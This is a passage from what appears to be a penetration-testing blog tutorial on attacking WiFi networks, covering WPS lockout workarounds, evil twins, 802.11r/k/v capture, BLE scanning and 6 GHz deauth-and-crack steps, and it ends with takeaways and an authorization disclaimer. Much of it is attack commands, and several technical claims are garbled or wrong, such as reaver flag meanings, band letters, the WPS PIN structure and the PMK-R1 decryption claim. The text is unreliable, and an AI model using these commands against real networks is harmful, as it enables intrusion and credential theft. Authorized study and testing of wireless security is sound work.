<li><strong>Cause 1:</strong> The real AP has stronger signal. <em>Fix:</em> Move closer to the target. Use a higher-gain antenna (9dBi vs 2dBi). Use a USB extension cable to move the adapter away from the laptop's metal chassis.</li>

<li><strong>Cause 2:</strong> The client has "network priority" set. <em>Fix:</em> On iOS: Settings → WiFi → \[Network] → "Forget Network." The client will see the rogue as "new" and connect. On Android: Settings → WiFi → \[Network] → "Forget."</li>

<li><strong>Cause 3:</strong> The client uses 802.1X (WPA-Enterprise) and validates the AP's certificate. <em>Fix:</em> You need a valid certificate for the enterprise SSID. Or: target the guest SSID (WPA-PSK) instead.</li>

</ul>



<h3>10.5 "WPS: Reaver Says 'WPS is Locked'"</h3>



<ul>

<li><strong>Cause:</strong> The AP has locked out WPS after 8 failed PIN attempts. The lockout lasts 300 seconds (5 minutes) or until reboot.</li>

<li><strong>Fix 1:</strong> Wait 5 minutes. Retry.</li>

<li><strong>Fix 2:</strong> Use <code>reaver -i wlan0mon -b BSSID -K -vv -l</code> (the <code>-l</code> flag sends a lockout bypass after each batch of 8 attempts).</li>

<li><strong>Fix 3:</strong> Reboot the AP. (If you have physical access or a KVM to the switch port.)</li>

<li><strong>Fix 4:</strong> Use the "offline attack" (<code>-K</code> flag). The AP reveals a valid PIN structure, reducing the search space without triggering lockout.</li>

</ul>



<hr>



<h2>Part 11: Advanced — Beyond the Basics</h2>



<h3>11.1 802.11r (Fast Roaming) Attacks</h3>



<p>802.11r allows a client to "fast roam" between APs without a full 4-way handshake. The client and AP agree on a PMK-R0 and PMK-R1. When the client moves to a new AP, it presents the PMK-R1 and the new AP derives the PTK directly. <strong>No handshake.</strong> No EAPOL. No ANonce/SNonce.</p>



<p>This means: if you can capture the PMK-R1 (from the FT-Authentication frame), you can decrypt all traffic on the fast-roaming AP without ever seeing a 4-way handshake.</p>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code># Capture FT frames (802.11r)

airodump-ng --channel 36 --bssid AA:BB:CC:DD:EE:FF \

\-w /root/wifi/ft wlan0mon

\#

\# (Look for "FT" frames in the capture:

\#  tshark -r ft-01.cap -Y "wlan.fc.type_subtype == 0x0024"

\#  → FT-Authentication frames)

\#

\# Extract the PMK-R1:

\# (The PMK-R1 is in the FT-Authentication frame body)

\# Convert to hashcat format and crack:

\# hashcat -m 22000 ft.hc22 rockyou.txt

</code></pre>



<h3>11.2 802.11k/v (Network Assistance) Attacks</h3>



<p>802.11k tells the client about nearby APs (BSS Transition Management). 802.11v tells the client about network parameters (channel, load, interference). These frames are <em>unencrypted</em> and broadcast. They reveal:</p>



<ul>

<li>The full topology of the wireless network (all APs, all channels)</li>

<li>Client load per AP (how many clients are connected)</li>

<li>Interference levels (what channels are noisy)</li>

<li>AP capabilities (which 802.11 features are enabled)</li>

</ul>



<p>You don't need to crack the WiFi to get this info. Just listen.</p>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code># Capture 802.11k/v frames

airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF \

\-w /root/wifi/kv wlan0mon

\#

\# Parse with tshark:

tshark -r kv-01.cap -Y "wlan.fc.type == 0" -V | \

  grep -A 20 "BSS Transition"

\# → Shows all nearby APs, channels, load

\#

\# Or:

tshark -r kv-01.cap -Y "wlan.fc.type == 0" -V | \

  grep -A 10 "WNM"

\# → Shows network assistance parameters

</code></pre>



<h3>11.3 Bluetooth Low Energy (BLE) Adjacent Attacks</h3>



<p>Many modern devices (phones, laptops, IoT) have both WiFi and BLE. If you can't crack the WiFi, you can sometimes get in via BLE:</p>



<ul>

<li><strong>BLE Just Works pairing:</strong> Some BLE devices use "Just Works" (no PIN). If you can pair, you can read the device's characteristics (battery level, device name, service UUIDs).</li>

<li><strong>BLE advertising:</strong> BLE devices broadcast advertising packets (unencrypted). These contain the device name, service UUIDs, and sometimes data (e.g., a smart lock's "unlocked" state).</li>

<li><strong>BLE relay:</strong> If a BLE device is the "gateway" for a Zigbee/Z-Wave IoT network, compromising the BLE gateway gives you access to the entire IoT mesh.</li>

</ul>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code># BLE scanning (nRF52840 + nRF Sniffer)

nrf-sniffer --scan --duration 30

\# → Device: "Apple Watch 9"

\#   UUID: 0000180F-0000-1000-8000-00805F9B34FB (Battery Service)

\#   Data: 85% (battery level)

\#

\# → Device: "SmartLock-Pro"

\#   UUID: 0000FF00-0000-1000-8000-00805F9B34FB (Custom)

\#   Data: 01 00 (locked)

\#

\# → Device: "HomeKit-Hub"

\#   UUID: 0000181C-0000-1000-8000-00805F9B34FB (User Data)

\#   Data: \[encrypted payload]

</code></pre>



<h3>11.4 6 GHz / WiFi 6E / WiFi 7</h3>



<p>WiFi 6E (802.11ax) and WiFi 7 (802.11be) operate on the 6 GHz band (5925-7125 MHz). This band is unlicensed and has 1400 MHz of spectrum (140 × 10 MHz channels or 70 × 20 MHz channels). Key differences for attackers:</p>



<ul>

<li><strong>Shorter range:</strong> 6 GHz signals attenuate faster. Your 40m range drops to ~25m. Move closer.</li>

<li><strong>More channels:</strong> 140 channels vs 11 (2.4 GHz). Your channel survey takes longer.</li>

<li><strong>WPA3 mandatory:</strong> WiFi 6E requires WPA3-PSK (SAE). No WPA2. No WPS. The handshake attack still works (if you can deauth). The PMKID attack may not work (WPA3 changes the PMKID format).</li>

<li><strong>MLO (Multi-Link Operation):</strong> WiFi 7 allows a device to connect on 2.4, 5, AND 6 GHz simultaneously. If you crack the 2.4 GHz link, you still have access even if the 6 GHz link is WPA3-Enterprise.</li>

</ul>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code># WiFi 6E / 6 GHz scanning

\# Requires: adapter with 6 GHz support (Intel AX211, MediaTek MT7921AU)

\# Kali: iw phy phy0 info | grep "6 GHz"

\#

\# Survey 6 GHz:

airodump-ng wlan0mon --band a

\# (or: --band a for 5 GHz, --band b for 6 GHz)

\#

\# Target: "CorpWiFi_6E" on ch 114 (6005 MHz), WPA3-PSK

\#

\# Deauth (6 GHz):

aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF \

\-c 11:22:33:44:55:66 wlan0mon --band b

\#

\# Crack:

\# Same hashcat -m 22000 workflow. The PSK → PMK → PTK chain

\# is identical for WPA3-PSK. The difference is SAE (the

\# initial key exchange) instead of the WPA2 4-way handshake.

\# But the 4-way handshake STILL happens after SAE.

\# So the handshake attack still works.

</code></pre>



<hr>



<h2>Conclusion: The Air Is the Network</h2>



<p>Every other attack surface in this series — web, kernel, physical, identity — requires you to be <em>on</em> the system. A network connection. A USB port. A Kerberos ticket. A process in memory.</p>



<p>Wireless is different. You don't need to be on the system. You need to be <em>near</em> the system. The air is the network. The electromagnetic spectrum is the cable. And a $35 USB stick with a 9dBi antenna can reach through a brick wall, over a parking lot, and into the 4th floor conference room where the C</p>

<p><strong>Key Takeaways:</strong></p>

<ol>

<li><strong>The 4-way handshake is deterministic.</strong> PSK + SSID + 2 nonces = PTK. If you capture the handshake, you can brute-force it offline. There is no rate limit on a GPU.</li>

<li><strong>PMKID is the "no-client" attack.</strong> Some APs leak a PMKID in a Probe/Association response. If you capture it, you have the same crackable hash without ever sending a deauth frame.</li>

<li><strong>WPA3 fixes the offline dictionary attack.</strong> SAE replaces the PSK with an ECC key exchange. You can't brute-force it offline. But you can still downgrade to WPA2 (transition mode) or attack the client's trust (evil twin).</li>

<li><strong>Evil twin is the ultimate credential harvester.</strong> You don't need the PSK. You just need the client to trust your AP. Bettercap handles the rest.</li>

<li><strong>WPS is a 4-digit PIN x 2.</strong> The AP reveals which half is correct. 20,000 attempts instead of 100 million. Disable WPS on every AP you own.</li>

<li><strong>The 7-command chain is the standard.</strong> Survey, capture, deauth, crack, evil twin, harvest, connect. 8 minutes from the parking lot to the internal network.</li>

<li><strong>Defend the air.</strong> WPA3, 802.11w (PMF), WIPS, client-side certificate validation, and a $0.50 rubber cap on every unused switch port.</li>

</ol>



<p><strong>The WiFi password is not a secret. It's a speed bump. And a $35 adapter is the ramp.</strong></p>



<hr>



<p><strong>Author:</strong> Aimad Ul Islam — Cybersecurity Student, Certified Ethical Hacker , Blue Cape DFIR Certified.</p>



<hr>



<p><em>Disclaimer: All techniques described in this article are offensive in nature and should only be performed on systems where you have explicit, written authorization. Injecting frames into a wireless network you do not own is illegal in most jurisdictions. Always test in a lab before running any attack against a production AP. This guide is for educational and professional penetration testing purposes only.</em></p>



</div>
